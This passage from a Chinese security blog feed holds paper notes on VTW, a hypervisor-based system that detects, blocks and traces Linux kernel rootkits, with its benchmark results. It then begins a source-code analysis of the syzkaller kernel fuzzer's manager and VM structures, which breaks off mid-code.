代码段按页对齐的特性，代码段的起始地址为 $data_start$-$N * page_size$ ，其值为 $module-&gt;module_core$。从 $writable_data_start$ 开始，我们假设每个字节的起始地址便是 LKM 代码的第一个地址。</p><p>接下来我们基于 $module-&gt;module_core$ 与 $module-&gt;core_text_size$ 间的相对位移计算 $module-&gt;core_text_size$ 的地址，对  $module-&gt;module_core$ 与 $module-&gt;core_text_size$  的正确表示为最后 12 位都为0、两者总和位 $data_start$。</p><p>之后我们以一个单字节作为步长检查所有在 $writable_data_start$ 之后的内存，直到我们获得合适的 $module-&gt;module_core$ 与 $module-&gt;core_text_size$ 。最后，module 结构体的第一个地址使用与 $struct\ module$ 相关的 $module-&gt;module_core$ 的偏移进行计算。相比于第一种方法，这种方法有着更大的范围，但实现过程相对更加复杂。 VTW 同时使用两种方法来达成最佳的防护效果。</p><h1 id="6-Rootkit-Tracing-Process"><a href="#6-Rootkit-Tracing-Process" class="headerlink" title="6 Rootkit Tracing Process"></a>6 Rootkit Tracing Process</h1><p>内核 rootkit 可能在 LKM 正在加载时或已被加载后发动攻击，单次攻击的参与者可能是单个或多个模块。</p><p>我们将修改内核数据的直接发起者作为行为载体，攻击的最初发起者称为动作载体，其代码替换了原始内核函数的 LKM 称为函数载体。</p><p>为了追踪所有参与了一次攻击的内核 rootkits，VTW 带来了两种新的方法：“跟踪此前与此后的 rootkit 攻击” 与 “攻击回放程序”，这些方法所需的条件如 表5 所示。</p><p><img src="https://s2.loli.net/2023/04/09/mnQvHSb8W5ANkg4.png" alt="image.png"></p><p>其他参与了攻击的 LKMs 被称为过程载体。这些载体之间可能存在重叠，例如正在被装载的 LKM 可以重定向内核控制流到导出函数，在这次攻击设想中，LKM 同时属于动作载体与行为载体，被装载的 LKM 属于函数载体，不存在过程载体。</p><p>所有被监控的 LKMs 形成了元组 $T$ ，所有参与了同一事件的 LKMs 形成了元组 $\mathscr{R}$ （表5 中的①）。当一个 LKM 正在运行，我们开启其执行权限，同时除了在其他 CPU 核心上正在运行的 LKMs 以外，其他所有 LKMs 的执行权限都被关闭（②）。所有运行在不同核心上的 LKMs 形成一个元组 $\mathscr{F}$ （表5 中的 ③）。要被调度以执行的 LKM （$\mathscr{F}$j）与第 k 个 CPU 核心关联（④），LKM 所属的内存被记录为 $\alpha$ （⑤）。</p><h2 id="6-1-Trace-LKM-Execution-Events"><a href="#6-1-Trace-LKM-Execution-Events" class="headerlink" title="6.1 Trace LKM Execution Events"></a>6.1 Trace LKM Execution Events</h2><p>有三种执行 rootkit 的方式，第一种为 LKM 在模块加载时调用其初始化函数，在这种情况下攻击可能在加载完成前被启动。</p><p>第二种为 LKM 在完成载入之后其导出函数被其他模块调用，被加载的 LKM 可以被调用以修改内核数据，或是被用作函数载体来替换内核的原始函数。</p><p>第三种为 LKM 被通过创建一个内核线程而执行，攻击可以在线程生命周期的任意时间被触发。</p><p>一个完整的攻击可能包括一种或多种上述的执行。为了监控 LKM 的执行，VTW 设置了目标已被装载 LKMs 为不可执行。</p><p>然而由于大量的内存设置操作，这种办法是低效的。以一个有着 4MB 代码段的 LKM 为例，VTW 必须要操作 EPT 页表多余 2000 次以完成一次执行权限的开启与关闭。为了减少页表设置操作的数量，VTW 建立了一种机制来管理 LKM 的执行权限，如 图.5 所示。</p><p><img src="https://s2.loli.net/2023/04/09/WcROlmhj4Yix2Aw.png" alt="图.5 页表重定向机制"></p><p>VTW 首先通过 $”struct \ module”$ 获得 LKM 代码段的地址范围，接下来其计算最后一级可以查找整个 LKM 代码地址范围的页表（$last_page_table$）。在其上层页表保存了 $last_page_table$ 地址的页表入口 （$orig_item$ ）将会被记录。</p><p>在这之后，VTW 创建一个新的页表 （$new_last_page_table$） 并通过 EPT 将其设为 “不可写”。其会使用 $new_last_page_table$ 的地址覆写 $orig_item$。接下来 VTW 将 $last_page_table$ 的所有内容拷贝到 $new_last_page_table$ 中。与此同时其会为每个目标 LKM 创建一份内存页并通过 EPT 将其设为 “不可执行”，该内存页被称之为 $fake_code$，其地址则为 $fake_mem$。</p><p>最后， LKM 的代码段 在 $new_last_page_table$ 中对应的的所有条目都被填充为 $fake_mem$，若我们尝试打开 LKM 的执行，则 $orig_item$ 将被用 $fake_mem$ 重写。由此，控制流将会被重定向到 $fake_code$ 上。 EPT 异常地址（$fake_item$）将说明哪一个 LKM 将要被执行。</p><p>在 LKM 执行中，第一个被执行的 LKM 称之为第一个模块，发出了模块间调用请求的 LKM 被称为活动模块，被调用的 LKM 被称为被调用模块。</p><p>在第一个 LKM 被执行前，VTW 读取调用函数储存在内核栈上的返回地址并在此处设置一个执行断点，接下来 VTW 启用 LKM 的执行权限。当控制流在 LKMs 之间切换时，我们追踪控制流流过的所有 LKMs。追踪方案如下所示。</p><h2 id="6-2-Forward-Versus-Backward-of-Rootkit-Attack"><a href="#6-2-Forward-Versus-Backward-of-Rootkit-Attack" class="headerlink" title="6.2 Forward Versus Backward of Rootkit Attack"></a>6.2 Forward Versus Backward of Rootkit Attack</h2><p>rootkits 攻击在如下所示的 11 个步骤的前向与后向阶段中被实施。该方法用以监控 LKM 控制流的跳转与返回。步骤 1 ~ 6 监控跳转，步骤 7 ~ 11监控返回过程。</p><p><img src="https://s2.loli.net/2023/04/09/XmxawZS56dG38kT.png" alt="image.png"></p><p>由于对 LKM 的权限设置，在该过程中任何在 LKMs（$ConFlowTrans$）间的控制流的跳转都将触发操作系统陷入到 “host” （步骤 1）。VTW 通过所流过的控制流记录每一个 LKM （步骤 2），并检查每个跳转的内核数据的合法性。若数据合法（步骤 3），VTW 将开启被调用模块的执行权限（$TurnOffExe$）并关闭活跃 LKM 的执行权限 （$TurnOnExe$，步骤 4）。否则，VTW 通过函数 $HandleException$ 处理非法的 LKM（步骤 5 ~ 6），并处理包括数据恢复（$RecoverData$）与 #GP 注入（$InjectGP$）的操作。</p><p>当 LKM 的控制流返回时（$ControlFlowRet$），VTW 跟踪返回动作（步骤 7 ~ 11），当返回到设置在第一个 LKM 的返回地址的断点时，意味着当前的执行完成了。</p><p>当活动的 LKM 提交了一个在 LKMs 间的调用请求或是控制流返回到之前的 LKM，VTW 将检测是否当前的内核数据已经被活动的 LKM 篡改了。对于动态内核数据，VTW 使用 “Rootkit 攻击检测” 方法进行检测。</p><p>对于有着写保护的静态内核数据，任何的篡改都将导致操作系统陷入到 “host”，之后 VTW 将操作系统设置到单步调试并启用对内核数据的写权限。由此，在 LKM 完成对静态内核数据的篡改后，其会再次陷入到 “host”。最后 VTW 读取被篡改的数据并使用备份数据中的初始值进行恢复。</p><p>通过上述操作，VTW 可以获得篡改的数据，将篡改的数据与所有 LKMs 的代码段范围进行对比，我们可以得知重定向控制流所属的 LKM。</p><p>若检测到内核数据被篡改了，当前运行的内核模块将被认为是攻击的行为载体，第一个模块将成为动作载体，重定向控制流所属的模块则成为函数载体。</p><p>其他的 LKMs 将成为过程载体。为了预防更多的伤害，VTW 向当前控制流注入一个通用保护异常。最后，被篡改的内核数据将被复原，当前的有害操作将被终止。</p><h2 id="6-3-Task-Switching-in-Multicore-Execution"><a href="#6-3-Task-Switching-in-Multicore-Execution" class="headerlink" title="6.3 Task Switching in Multicore Execution"></a>6.3 Task Switching in Multicore Execution</h2><p>当 LKM 执行时发生了任务切换，LKM 的 CPU 资源将被收回。若 LKM 不再被调度，其将永远不会产生模块间调用请求，我们在返回地址设置的执行断点将永远不会被执行。由于缺乏触发条件，VTW 将在最后一次检测后忽略掉 LKM 在内核上的影响。</p><p>不同的 LKMs 可能被在多个核心上并行执行，这可能影响对行为载体的识别，例如两个 LKMs 可能同时在不同的 CPU 核心中运行。若动态内核对象被检测到在其运行时被篡改，我们无法算出这两个 LKMs 中的哪一个进行了有害操作。</p><p>为了确保精确的可追踪性，VTW 引入一个动作回放方法，在 “攻击回放程序”（Attack Playback Procedure）中展示。当一个 LKM 被调度以执行且在其他核心上有一个或更多 LKMs 正在被执行，则该方法会被启动。</p><h2 id="6-4-Attack-Playback-Procedure"><a href="#6-4-Attack-Playback-Procedure" class="headerlink" title="6.4 Attack Playback Procedure"></a>6.4 Attack Playback Procedure</h2><p>当多个 LKMs 同时跑在多个核心上时，该方法用以辨别哪一个 LKM 为内核 rootkit。攻击回放程序如下所示，步骤 1 ~ 5 为所需内容，步骤 6 ~ 9 进行回放。当 LKM $\mathscr{L}j$ 被载入在一个核心上运行时（$LoadOnCore$），该执行必须触发操作系统陷入到 host 模式（“攻击回放程序” 中的 步骤 1）。在这之后， $\mathscr{L}j$ 将被记录到元组 $\mathscr{F}$ 中（步骤 2）。</p><p>VTW 首先通过函数 $CheckKernel$ 检查当前的内核数据完整性是否被破坏，若未被破坏（步骤 3），其会拷贝当前的 CPU 上下文信息、内核栈、LKM 代码段（所有这些称作回放上下文）。</p><p><img src="https://s2.loli.net/2023/04/09/4qFEaxVPRTUcJCb.png" alt="image.png"></p><p>若有多于一个 LKM 运行在不同的 CPU 核心上，所有运行中的 LKMs 都已被备份，由此我们只需要备份要被执行的 LKM（步骤 4 ）。若仅有一个运行中的 LKM，正在被执行的 LKM 与将要被执行的 LKM 都需要要被备份（步骤 5）。在完成备份后，VTW 将操作系统再次切换回 “guest” 模式以继续运行。</p><p>为了算出哪一个 LKM 为内核 rootkit，所有的动作都会被通过 $ForEach$ 与 $ExeBack$ 函数为所有在其他核心上运行的 LKMs 逐一进行回放。回放步骤如 图.6 所示，回放过程为如下所示的五个步骤：</p><p>1） 使用之前备份的内容重写当前内核栈与 LKM 的数据。</p><p>2） 使用备份的 CPU 上下文填充 VMCS 的 “guest filed” 并恢复被破坏的内核数据。</p><p>3） 将操作系统切换到 “guest” 模式以开始 LKM 执行。</p><p>4） 在内核数据被摧毁的指令位置停止执行。</p><p>5）检测是否一个被破坏的数据将触发二次破坏。当前的 LKM 为行为载体。若该内核数据保持完整，则切换到步骤 （1） 恢复回放。</p><p><img src="https://s2.loli.net/2023/04/09/iagyB7kZt3jJnWT.png" alt="图.6 跟踪一个 Linux 服务器上两个执行核心间的任务切换"></p><p>通过该方法，每个 LKM 都将会从内核数据未被摧毁的位置开始执行，并停止在内核数据被摧毁的位置。若被回放的 LKM 破坏了内核数据的完整性，其将被识别为 rootkit（步骤 9）。</p><p>在追踪完成之后，VTW 将为剩余的 LKMs 恢复执行，并让他们从内核数据完整性被破坏的位置继续执行。</p><p>在动作回放过程中，被恢复的内核数据包括被篡改的内核数据与回放上下文，对前者的恢复将维持内核的完整性，后者则仅与被回放的 LKM 相关。由此，被恢复的内核数据并不会影响其他 LKMs 的执行。</p><p>我们分析了 23 个内核 rootkits 并发现除了回放上下文以外，他们不会修改其他内核数据。在对 72 个在 Linux 中被频繁使用的普通 LKMs （例如 $nf_nat,ib_cm,snd_seg$ 等）的监控过程当中，我们发现普通的 LKMs 将不会修改被保护的内核数据，也不会修改在回放上下文以外的任何东西。</p><p>由此，在进行动作回放时我们并不需要恢复除了被篡改的内核数据与回放上下文以外的内核数据，这并不会影响其他 LKMs 的正确性。</p><h1 id="7-Experiments-And-Performance-Analysis"><a href="#7-Experiments-And-Performance-Analysis" class="headerlink" title="7 Experiments And Performance Analysis"></a>7 Experiments And Performance Analysis</h1><p>我们使用几个内核 rootkit 与基准测试来测试 VTw 的防护效果与运行效率。</p><h2 id="7-1-Experimental-Environment"><a href="#7-1-Experimental-Environment" class="headerlink" title="7.1 Experimental Environment"></a>7.1 Experimental Environment</h2><p>实验中的物理 host 为一个有一颗 Intel i3-9100 @ 3.6 GHZ 4核心处理器、8G内存、256G硬盘的 HP 桌面电脑。不同 rootkit 的安装环境是非常不同的，为了安装 rootkit $f00lkit$，我们使用 Ubuntu 12.04 与内核 3.2.16 作为被测试操作系统。</p><h2 id="7-2-Rootkit-Detection-Defence-and-Traceability"><a href="#7-2-Rootkit-Detection-Defence-and-Traceability" class="headerlink" title="7.2 Rootkit Detection, Defence, and Traceability"></a>7.2 Rootkit Detection, Defence, and Traceability</h2><p>$f00lkit$ 通过修改系统调用表来隐藏目标对象，其将控制流重定向到其自己的代码段上。VTW 在 $f00lkit$ 上的检测效果如 图.7 所示。</p><p><img src="https://s2.loli.net/2023/04/09/4G8tqF7iSLXAjOv.png" alt="图.7 对一个典型被检测的 rootkit 攻击（f00lkit）的过程的虚拟化"></p><p>上、中、下三个窗口分别为在 VTW 载入之前对操作系统的入侵表现、在 VTW 载入后对操作系统的入侵表现、VTW 的防护结果。在上面的窗口中，我们发现 $f00lkit$ 可以隐藏以 $”f00l_“$ 开头的文件，如第二行所示。</p><p>中间的窗口显示了在 VTW 载入后 $f00lkit$ 不再对以 $”f00l_“$ 开头的文件有着隐藏的效果，当 $f00lkit$ 尝试修改系统调用表时，VTW 检测到了其意图并生成一个 “EPT violation”，之后 VTW 将一个 #GP 提交到 “guest” 进行预防。</p><p>为了测试 VTW 的可追踪性，我们重写了 rootkits $f00lkit$ 与 $xingyiquan$ ，并引入了两个辅助的 LKMs $jmp_lkm$ 与 $action_lkm$ ，在我们设置的攻击场景中，$f00lkit$ 并不会摧毁内核数据，其有一个用于替换系统函数以隐藏以 $”f00l_“$ 开头的文件的导出函数 $func_1$。</p><p>在辅助 LKM $action_lkm$ 中还有一个导出函数 $func_2$ 。当 $func_2$ 被执行时，其会篡改内核数据并将系统控制流重定向到  $func_1$ 。在辅助 LKM $jmp_lkm$ 中的导出函数为  $func_3$ ，在  $func_2$ 执行过程中  $func_3$ 会被调用。</p><p>上述三个导出函数直到被其他 LKMs 调用时才会被执行。当 $xingyiquan$ 执行时， $func_3$ 被 $xingyiquan$ 调用，最后内核函数被通过  $func_2$  重定向至 $f00lkit$。</p><p>LKM $action_lkm$ 直接篡改系统调用表，其为一个行为载体。原有的系统调用函数被 $f00lkit$ 中的函数所替，由此，VTW认定 $f00lkit$ 为一个函数载体。该次攻击的第一个发起者为 $xingyiquan$，其通过 $lkm_jmp$ 使得控制流跳转到其他模块，由此 $xingyiquan$ 被确定为动作载体，$jmp_lkm$ 被确定为过程载体。</p><p>VTW 检测、防御、追踪包括 $adore$-$ng、kbeast、wnps、brootus、diamorphine、z$-$rootkit、suterusu$ 等在内的内核 rootkits。VTW 通过 EPT 页表为如系统调用表的内核对象设置写保护，由此，任何写操作都将导致操作系统从 “guest” 模式陷入到 “host” 模式。</p><p>之后 VTW 使用 #GP 异常来防止非法操作。内核 rootkits 的整个执行过程都被 VTW 所监控。通过操控 LKMs 的执行权限，VTW 可以夺取每个 LKM 的执行。由此，LKM 的调用、跳转、返回都被同步记录。</p><h2 id="7-3-Performance-Evaluation"><a href="#7-3-Performance-Evaluation" class="headerlink" title="7.3 Performance Evaluation"></a>7.3 Performance Evaluation</h2><p>在本节中， VTW 在 CPU 上的执行开销将被使用 $nbench$ 测量，对系统延迟与带宽的影响将被 Lmbench 测量，对 I&#x2F;O 的影响将被 IOMeter 测量。所有的结果都在原生操作系统测试中进行了标准化。</p><p>$Nbench\ Test$。测试结果如 图.8 所示。VTW 引入了小于 2% 的 CPU 开销。VTW 本质上是一个轻量级的 hypervisor 且不提供如其他虚拟化平台（例如 Xen）那样复杂的虚拟化功能。由此，其带给 CPU 的性能开始非常小。</p><p><img src="https://s2.loli.net/2023/04/10/B4QEyK5VCW9JviO.png" alt="图.8 VTW 方案的执行开销。x-axis 显示了运行速度损失系数，y-axie 为执行的基准测试程序"></p><p>$Lmbench\ Test$。Lmbench 被用以测量系统延迟与贷款。测试结果如 图.9a、9b、9c 所示。VTW 增加了平均 8.8% 的内存与网络延迟与平均 5.9% 的文件操作延迟。通信带宽减少了 2.2%。</p><p><img src="https://s2.loli.net/2023/04/10/crCIiGy58atvN29.png" alt="图.9 内存/网络访问延迟，文件操作与 IO 带宽的减少被绘制为系统对基准或网络、内存、文件访问操作的百分比"></p><p>在 Lmbench 测试中，我们发现 OS 在 “host” 与 “guest” 间的切换频率显著地增长了，大部分的切换由指令 $cpuid$ 引起。由于缓存操作速度非常快，其对于任何的延迟都是极度敏感的。由此，在缓存上的模式切换的影响是尤其明显的，导致了将近 20% 的延迟开销。</p><p>$IOMeter Test$。IOMeter 是由 Intel 开发的一个用以测试最大磁盘 I&#x2F;O 性能与最大数据吞吐量的一个测试工具测试结果如 图.10a、10b 所示，该图展示了 VTW 造成了平均 8.9% 的 I&#x2F;O 带宽减少，与平均 3.9% 的运行时间增长。</p><p><img src="https://s2.loli.net/2023/04/10/NRl3YwFcbPjtvEC.png" alt="I/O表现开销绘制为 I/O 带宽损失系数与 I/O 时间增长 "></p><p>VTW 在 I&#x2F;O 上的影响主要由 I&#x2F;O 操作的运行时间导致，这减少了 I&#x2F;O 吞吐量且增加了 I&#x2F;O 响应时间。由 VTW 引入的开销包括存储与计算开销。</p><p>存储开销主要指内存开销，包括内存空间开销与寻址时间开销。 VTW 占用不多于 200KB 的内存空间来存储其核心代码与数据，以及 64KB 以存储被保护的内核数据。</p><p>计算开销来自由 VTW 带来的事件注入、内核保护与异常处理，这些操作将造成操作系统从 guest 模式陷入 “host” 模式。</p><p>在 host 模式中，VTW 将接管控制流并进行异常处理。在异常处理完成之后，VTW 将操作系统切换回 “guest” 模式，并将控制流返还给操作系统进行后续执行。</p><p>在整个过程中 “guest” 模式的执行始终是被阻塞的，因此如执行速度、延迟、网络延迟、I&#x2F;O 吞吐这样的表现指示器将会受到影响。此外，模式切换造成对 TLB 与缓存的刷新，这将增加对操作系统的性能影响。</p><p>当 VTW 正在运行，导致操作系统进行模式切换的因素包括指令陷入与事件陷入，前者由对特定指令的执行触发，后者由特定事件触发。在 guest 模式中，对指令 CPUID、GETTSEC、INVD、XSETBV 与除了 VMFUNC 以外的所有 VMX 指令都将导致操作系统无条件地陷入到 “host”。</p><p>触发操作系统模式切换的事件包括模块加载、模块卸载、在模块加载时的状态切换、模块间的跳转与控制流返回、模块调度执行、“host” 私有页表的更新、篡改静态内核数据、单步调试模式、动作回放。</p><p>$Impact on the Execution Speed of LKM$。为了测量 VTW 在 LKM 执行速度上的影响，我们引入了两个测试模块 $LKM_1$ 与 $LKM_2$ ，他们分别属于 CPU 密集型与 I&#x2F;O 密集型的模块，前者用以计算 $\pi$ 的值，后者用以读写文件。</p><p>测试结果如 图.11 所示。横坐标为实线指示了 $\pi$ 小数点后的位数，与文件操作数量相关的为点线。纵坐标指示了速度损失速率。</p><p><img src="https://s2.loli.net/2023/04/10/LwJ8WEfkNdTosPb.png" alt="图.11 LKM 速度损失系数与 Π 的小数位数绘制为实线，I/O 操作的数量绘制为点线"></p><p>与此相反，当模块运行较长一段时间时，由 VTW 造成的性能损失比例更小。对于普通 LKMs 而言，VTW 仅在他们被加载以及状态被更新时干涉他们的执行。由 VTW 造成的 “guest” 的阻塞时间是比较固定的。当 LKM 的执行时间较短时，VTW 会阻塞 “guest” 模式更多比例的时间，由此性能损失系数会变得更大。</p><p>陷阱的数量与在模块间的控制流跳转的数量为影响 LKM 执行速度的关键因素。我们以一个运行时间大约 7.6s 的 $LKM_3$ 作为测试对象，并测量了陷阱数量在其执行速度上的影响。</p><p>我们重写了 $LKM_1$ 与 $LKM_2$ 使得控制流在其间跳转， 他们可以被用以测量跳转次数对 LKM 执行速度的影响。实验结果如 图.12 所示。</p><p><img src="https://s2.loli.net/2023/04/11/p4HBzul5Tcj9iRm.png" alt="图.12 系统陷阱与控制流跳转在 LKM 执行速度上的影响"></p><p>点线显示了当陷阱数量较少时 VTW 在 LKM 的执行速度上的影响是较小的。当陷阱数量超过 1000000 时，LKM 的执行将会减速到 80%。实线显示了当跳转数量超过 100 时，VTW 减速到了 8%。当跳转数量超过 1000 时， LKM 的执行速度将会急剧减小。</p><p>控制流跳转对 LKM 执行的影响比陷阱更大。一个完整的跳转与返回涉及到两个模式切换与四个代码执行权限，因此 VTW 在处理模块间跳转时会遇到更多的开销，</p><h2 id="7-4-Comparison-With-Other-Defence-Schemes"><a href="#7-4-Comparison-With-Other-Defence-Schemes" class="headerlink" title="7.4 Comparison With Other Defence Schemes"></a>7.4 Comparison With Other Defence Schemes</h2><p>在 表.6 中，我们将 VTW 的表现与七个已知 rootkit 防御方案对比。大部分其他的 rootkit 防护方案应用了虚拟机的内省技术，这与 VTW 主要基于事件追踪的方案是非常不同的。</p><p><img src="https://s2.loli.net/2023/04/11/1wYp3xarzkyiXSF.png" alt="表.6 VTW 方案与其他防护方案对比"></p><p>我们从四个表现领域对他们进行定性比较：$检测、防护、可追踪性、可移植性$。VTW 在这四个领域有着如前文所述的显著的优点。在未来的工作中需要更多的基准测试实验以揭示一些定量的结果。</p><p>我们的 VTW 仅被设计以支持 Intel 处理器及仅保护基于 Linux 的 x86 服务器。当前的 VTW 版本并不支持运行 Windows 或其他操作系统平台的服务器。然而，Virtuoso 方案已经报告了其在不同平台上的高可移植性。</p><p>根据解决恶意软件变种的能力，我们将检测、防护、可追踪性能力分为三个级别：好、一般、差。</p><p>对于 rootkit 检测，VTW、Xtier、Virtuoso、RTKDSM 都被评为好。对于防护与可追踪性，所有的方案都被评为一般或差，仅有 DIKernel 展示了一些防护能力。与 VTW 类似，所有报道的方案都运行在 x86 处理器，除了 DIKernel 在 arm-v7。</p><p>我们的实验揭示了一些在 CPU 上的测量结果与存储开销。如与 表.6 中剩余的方案对比所示，VTW 在实施所有的防护与过滤操作的系统开销上展现了显著的优势。特别的，我们想要指出使用 VMST 与 PTKDSM 方案的过度开销。</p><h1 id="8-Concluding-Remarks"><a href="#8-Concluding-Remarks" class="headerlink" title="8 Concluding Remarks"></a>8 Concluding Remarks</h1><p>本论文提出了一种新的虚拟化墙（virtual wall，VTW）方案以在 Linux 服务器上过滤内核 rootkit。总而言之，我们证明了我们的 VTW 防护方案在 rootkit 的检测、防护、可追踪性上有着较好的表现。VTW 比其他任何 rootkit 防护系统的内存与存储开销都要低得多。</p><p>所有在 guest 模式下损坏安全策略的操作都将导致操作系统陷入到 host 模式中，VTW 利用一种内存访问控制机制与一个事件注入机制来完成 rootkit 过滤过程。</p><p>未来追踪 LKMs 的执行路径与所有的内核攻击参与者，我们提出了一种基于 LKM 执行路径的追踪机制。我们的 VTW 实时保护了静态内核数据的完整性。对于动态内核对象，VTW 在追踪过程中检测内核数据的可用性，由此每个被破坏的 LKM 数据都可以被检测与恢复。</p><p>我们的 VTW 使用通用防护异常来防止更多的损害。当内核攻击的参与者涉及多个内核 rootkits 时，我们可以通过检查 LKM 的执行路径获得与攻击相关的执行实体。我们追踪在一次攻击中所有参与的内核 rootkits。VTW 为总的 CPU 时间增加了额外的 2% 。</p><p>消极的一面是，VTW 被限制于仅能保护 Linux 服务器。我们的 VTW 方案仅支持 Intel 处理器与 Linux 系统。VTW 并不能在 AMD、ARM 处理器或是运行 Windows 的服务器上运行。SYRINGE、VMST、DIKernel 防护方案亦是如此。</p><p>VTW 对 BIOS 或用户级的 rootkit 攻击的防护有限。对于可能损害内核完整性的 rootkits，他们可能使用 $&#x2F;dev&#x2F;kmem$ 或 $&#x2F;dev&#x2F;mem$ 或其他方案，这可以从本论文的 VTW 中扩展。由于页数限制，我们将在未来的工作中使用这些扩展。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;任何 rootkit，终将绳之以法！&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="ROOTKIT" scheme="https://arttnba3.github.io/tags/ROOTKIT/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>【FUZZ.0x02】syzkaller - II：syz-manager源码分析</title>
    <link href="https://arttnba3.github.io/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/"/>
    <id>https://arttnba3.github.io/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/</id>
    <published>2023-03-01T17:33:58.000Z</published>
    <updated>2023-03-01T20:40:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>宁就是👴の Manager 🐎</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>syzkaller 是一个非常经典的 kernel fuzzer，虽然笔者之前曾经用过（不过笔者太菜了啥都没挖出来）也曾粗略读过源码，但是没有太过于仔细分析就抛在脑后了（悲）</p><p>为了深入学习 fuzzing theory，笔者决定先从这个典中典的 syzkaller 源码进行分析学习 ：）</p><h2 id="PRE-工作原理"><a href="#PRE-工作原理" class="headerlink" title="PRE.工作原理"></a>PRE.工作原理</h2><p>对于 syzkaller 的架构，官方给出了这样的一张 Overview</p><p><img src="https://i.loli.net/2021/11/11/LxNvdhpEX2sBjYc.png" alt="image.png"></p><p>syzkaller 整体上为一个<strong>双机调试结构</strong>：由一台机器负责管控整个 fuzzing 流程（本文称为 <code>Host</code>），在另一台机器上进行 fuzzing（本文称为 <code>Guest</code>），Guest 通常为虚拟机，从而能让 Host 更好地管控整个流程</p><p>syzkaller 分为三大组件：</p><ul><li><p>位于 Host：</p><ul><li><code>syz-manager</code> ：syzkaller 的控制中枢，其会启动多个 VM 实例（如图所示的一个黄色卡片就是一个实例）并进行监视，同时通过 RPC 来启动 <code>syz-fuzzer</code></li></ul></li><li><p>位于 Guest：</p><ul><li><code>syz-fuzzer</code> ：负责引导整个 fuzz 的过程：<ul><li>生成 input</li><li>启动 <code>syz-executor</code> 进程进行 fuzz</li><li>从被 fuzz 的 kernel 的 <code>/sys/kernel/debug/kcov</code> 获得覆盖（coverage）的相关信息</li><li>通过 RPC 将新的覆盖回送到 <code>syz-manager</code></li></ul></li><li><code>syz-executor</code>：负责<strong>执行单个输入</strong>——从 <code>syz-fuzzer</code> 处接受 input 并执行，最后回送结果</li></ul></li></ul><p><code>syz-manager</code> 为 syzkaller 的控制中枢，其会启动多个 VM 实例并进行监视，同时通过 RPC 来启动 <code>syz-fuzzer</code>，我们通常启动 fuzzing 时便是以 <code>syz-manager</code> 作为程序启动的入口点，因此笔者也先从此处开始分析</p><h1 id="0x01-基本结构体"><a href="#0x01-基本结构体" class="headerlink" title="0x01. 基本结构体"></a>0x01. 基本结构体</h1><p>相比于直接开始分析源码，笔者认为有必要在此之前先列出一些基本的结构体，你也可以把这一节当成一个表来查 ：）</p><h2 id="VM-管控相关"><a href="#VM-管控相关" class="headerlink" title="VM 管控相关"></a>VM 管控相关</h2><p>Host 需要去感知与管控 Guest VMs，因而在 <code>syz-manager</code> 当中有着一套相应的表示与管理 Guest VM 的结构体</p><h3 id="1-Instance：VM-实例"><a href="#1-Instance：VM-实例" class="headerlink" title="1. Instance：VM 实例"></a>1. Instance：VM 实例</h3><p><code>syz-manager</code> 中的 VM 实际上是使用一个名为 <code>Instance</code> 的结构体来表示的，定义于 <code>vm/vm.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">struct</span> &#123;<br>impl     vmimpl.Instance<br>workdir  <span class="hljs-type">string</span><br>timeouts targets.Timeouts<br>index    <span class="hljs-type">int</span><br>onClose  <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>类似地，其需要实现 <code>Interface</code> 接口，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Instance 表示一个单独的 VM.</span><br><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Copy 复制一个 hostSrc 文件到 VM 中并返回 VM 中的文件名.</span><br>Copy(hostSrc <span class="hljs-type">string</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Forward 设置从虚拟机内到主机上给定 tcp 端口的转发，</span><br><span class="hljs-comment">// 并返回要在虚拟机中使用的地址.</span><br>Forward(port <span class="hljs-type">int</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Run 在虚拟机内执行命令 (类似 ssh cmd).</span><br><span class="hljs-comment">// outc 接受混合了命令行与内核控制台的输出.</span><br><span class="hljs-comment">// errc 接受命令等待返回 error 或 vmimpl.ErrTimeout.</span><br><span class="hljs-comment">// Command 在 timeout 后停止. 在 stop chan 上发送可以用以更早将其终止.</span><br>Run(timeout time.Duration, stop &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, command <span class="hljs-type">string</span>) (outc &lt;-<span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span>, errc 